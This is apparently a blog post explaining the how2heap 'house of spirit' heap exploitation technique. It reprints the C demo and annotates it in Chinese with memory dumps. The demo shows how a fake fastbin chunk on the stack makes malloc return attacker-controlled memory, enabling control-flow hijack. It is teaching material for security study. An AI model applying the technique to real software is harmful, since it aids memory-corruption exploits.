---
title: how2heap - house of spirit
categories:
  - how2heap
tags: null
published: true
---

# Overview

- [house_of_spirit.c](https://github.com/shellphish/how2heap/blob/master/house_of_spirit.c)

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file demonstrates the house of spirit attack.\n");

	fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
	malloc(1);

	fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
	unsigned long long *a;
	// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
	unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

	fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[7]);

	fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
	fake_chunks[1] = 0x40; // this is the size

	fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
	fake_chunks[9] = 0x1234; // nextsize

	fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
	a = &fake_chunks[2];
1
	fprintf(stderr, "Freeing the overwritten pointer.\n");
	free(a);

	fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```

# House of Spirit

这个程序演示 house of spirit 攻击原理，首先调用一次 malloc 让操作系统分配堆内存

```c
malloc(1);
```

攻击者构造一个 fake chunk，再覆盖掉一个指针使之指向 fake chunk

```c
unsigned long long *a;
unsigned long long fake_chunks[10] __attribute__ ((aligned(16)))

fake_chunks[1] = 0x40;	// fake chunk 的 size

fake_chunks[9] = 0x1234; // nextsize

0x7fffffffdd30:	0x00000000	0x00000000	0x00000040	0x00000000	-> fake chunk
0x7fffffffdd40:	0x0000ff00	0x00000000	0x00000000	0x00000000
0x7fffffffdd50:	0x00000001	0x00000000	0x004008ed	0x00000000
0x7fffffffdd60:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdd70:	0x004008a0	0x00000000	0x00001234	0x00000000	-> next chunk
```

让一个指针指向构造好的 fake chunk，并释放掉它

```c
a = &fake_chunks[2];

free(a);
```

这时 fastbin 中会缓存 fake chunk，再次 malloc 相匹配大小的 chunk 时会返回受攻击者控制的 fake chunk

```c
0x7ffff7dd1b20 <main_arena>:	0x00000000	0x00000000	0x00000000	0x00000000
0x7ffff7dd1b30 <main_arena+16>:	0x00000000	0x00000000	0xffffdd30	0x00007fff	-> fake chunk
0x7ffff7dd1b40 <main_arena+32>:	0x00000000	0x00000000	0x00000000	0x00000000
0x7ffff7dd1b50 <main_arena+48>:	0x00000000	0x00000000	0x00000000	0x00000000

victim = malloc(0x30);
```

而 fake chunk 可以是 heap、stack、etc 上的任意一块内存，这里 `victim` 指针指向 stack 而不是 heap，攻击通过修改栈上的返回地址可以劫持程序的控制流

运行结果

![]({{ site.baseurl }}/images/house_of_spirit.png)